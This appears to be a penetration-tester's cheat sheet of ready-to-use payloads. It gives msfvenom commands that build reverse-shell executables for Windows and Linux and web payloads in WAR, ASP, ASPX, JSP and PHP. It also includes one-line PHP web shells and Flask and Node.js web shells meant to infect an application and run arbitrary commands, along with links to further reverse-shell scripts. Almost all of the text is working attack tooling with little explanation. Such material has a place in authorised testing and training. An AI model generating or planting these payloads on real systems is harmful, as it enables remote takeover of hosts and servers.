# Shell and Some Payloads
## Payload Structure - msfvenom
-> A staged payload is usually shipped in two parts. The first part contains a small primary payload that will establish a connection, transferring a larger secondary payload with the rest of the shellcode.
-> e.g.  
```
windows/shell_reverse_tcp (stageless)
windows/shell/reverse_tcp (staged)
linux/shell_reverse_tcp (stageless)
linux/shell/reverse_tcp (staged)
```

## Non-Meterpreter Binaries
### Windows
#### .exe x86 staged - msfvenom (Non-Meterpreter)
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

#### .exe x64 staged - msfvenom (Non-Meterpreter)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### .exe x86 stageless - msfvenom (Non-Meterpreter)
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

#### .exe x64 stageless - msfvenom (Non-Meterpreter)
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

### Linux
#### .elf x86 staged - msfvenom (Non-Meterpreter)
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### .elf x64 staged - msfvenom (Non-Meterpreter)

```
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### .elf x86 stageless - msfvenom (Non-Meterpreter)

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### .elf x64 stageless - msfvenom (Non-Meterpreter)
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Web Payloads
### Java WAR - msfvenom (Non-Meterpreter)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### ASP - msfvenom (Non-Meterpreter)
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

### ASPX
```
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f aspx > shell.aspx
```

### JSP - msfvenom (Non-Meterpreter)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### WAR - msfvenom (Non-Meterpreter)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### PHP - msfvenom (Non-Meterpreter)
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
or  
-> Find and edit
```
locate php-reverse-shell
```
or  
https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php

## Web Shells
### PHP 
```
<?php echo shell_exec($_GET['cmd']);?>
<?php system($_GET['cmd']);?>
<?php echo exec($_GET['cmd']);?>
```

### JSP
-> Find and edit
```
locate jsp-reverse.jsp
```

### Perl
-> Find and edit
```
locate perl-reverse-shell.pl
```
### Webshell Infecting views.py - Python (Flask)
```
import os
from flask import Flask,request,os

app = Flask(__name__)
   
@app.route('/okay')
def cmd():
    return os.system(request.args.get('c'))

if __name__ == "__main__":
	app.run()
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py

### nodejs
```
const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('...')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/okay/:command', (req, res) => 
res.send(Exec(req.params.command))
);
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js

https://www.revshells.com/

## Web Shells

https://www.urlencoder.org/
